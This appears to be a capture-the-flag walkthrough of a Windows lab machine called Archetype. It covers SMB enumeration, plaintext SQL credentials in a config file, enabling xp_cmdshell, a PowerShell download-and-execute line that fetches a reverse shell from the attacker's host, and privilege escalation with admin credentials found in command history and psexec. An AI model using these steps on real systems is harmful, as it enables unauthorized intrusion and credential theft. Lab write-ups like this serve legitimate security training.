# Archetype

- Machine IP: 10.10.10.27

## nmap scan

```bash
[exyss@exyss Archetype]$ nmap -sC -sV -p1-1024 10.10.10.27 -oN nmap/initial
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h39m15s, deviation: 4h02m32s, median: 19m13s
| ms-sql-info: 
|   10.10.10.27:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-01T03:49:09-07:00
```

As we can see, our target is running an an SQL service and an SMB service (Samba)

## SMB Service security analysis

```powershell
[exyss@exyss Archetype]$ smbclient -L 10.10.10.27 -N
smbclient: Can't load /etc/samba/smb.conf - run testparm to debug it

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

We found an existing sharename without password protection. We can try to access this sharepoint using 
`smbclient //10.10.10.27/backups -N`, searching for files to download (Samba can be interacted with using FTP commands, in this case the GET command)q

```bash
[exyss@exyss Archetype]$ smbclient //10.10.10.27/backups -N
smbclient: Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 13:20:57 2020
  ..                                  D        0  Mon Jan 20 13:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020

                10328063 blocks of size 4096. 8248285 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (3.4 KiloBytes/sec) (average 3.4 KiloBytes/sec)
smb: \> exit
```

The downloaded file contains the following text:

```xml
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

As we can see, there are two interesting plaintext data regarding the SQL user `ARCHETYPE\sql_svc` and it's password `M3g4c0rp123`.

## Accessing the SQL service

Once we have found the credentials, we can try accessing the SQL service by using Impacket's [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) script and trying to run a query to find out if our current user has admin priviledges:

```sql
[exyss@exyss Archetype]$ python mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands

SQL> SELECT IS_SRVROLEMEMBER('sysadmin')
```

Looks like our user has the system administator permissions, meaning that we have the highest SQL  permissions possible. Knowing this, we can enable XP shell commands directily through the SQL server:

```sql
SQL> EXEC sp_configure 'show advanced options', 1
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.

SQL> RECONFIGURE

SQL> sp_configure
name                                      minimum       maximum   config_value     run_value   

-----------------------------------   -----------   -----------   ------------   -----------   

access check cache bucket count                 0         65536              0             0   

.
.
.

SQL> EXEC sp_configure 'xp_cmdshell', 1
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.

SQL> RECONFIGURE
SQL> xp_cmdshell "whoami"
output                                                                             

--------------------------------------------------------------------------------   

archetype\sql_svc                                                                  

NULL                                                                               

SQL> 
```

Looks like the user that started this SQL server is the same that we already have, however this user doesn't have admin priviledges on the machine, but only on the SQL service.

## Obtaining a reverse shell

Next, we can try to obtain a reverse shell, giving us the ability to run commands on the target machine.

To do this, we have to first write (or find on the Internet :P) a [PowerShell script](scripts/reverse-shell.ps1) that can bounce us back a shell on our machine.
ATTENTION: remember to change the script with YOUR machine's ip address! (In my example this will be 10.10.14.126)

Once we got the script, we can fire up a simple Python server on port 4444 using `python -m http.server 4444` and a netcat listener on port 443 using `sudo nc -lvnp 443`.

Then, we have to change our firewall rules in order to forward the incoming traffic, enabling the communication between our netcat listener (which will receive the bouncing reverse shell) and the server.
We can do this by using UFW and running `ufw allow from 10.10.10.27 proto tcp to 0.0.0.0 port 4444,443`

Then, we have to connect again to the SQL service and run the following command, which will execute our reverse shell script on the target machine:

```sql
SQL> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.126:4444/scripts/reverse-shell.ps1\");"
```

Our netcat server will have received the reverse shell, meaning now we have full access to the sql_svc user's files. We can find the flag in `C:\Users\sql_svc\Desktop\user.txt`

## Priviledge escalation

Since this user account is also a service account, there probably are files that include frequently used commands or credentials. We can find one in: `C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history.txt`:

```powershell
$ type ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

Now that we have found the admin password, we can use Impacket's [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) script to spawn an admin shell, access the admin's desktop and get the flag:

```powershell
[exyss@exyss Archetype]$ python https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py administrator@10.10.10.27
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.27.....
[*] Found writable share ADMIN$
[*] Uploading file iPQjYOen.exe
[*] Opening SVCManager on 10.10.10.27.....
[*] Creating service dmUb on 10.10.10.27.....
[*] Starting service dmUb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop>type root.txt
```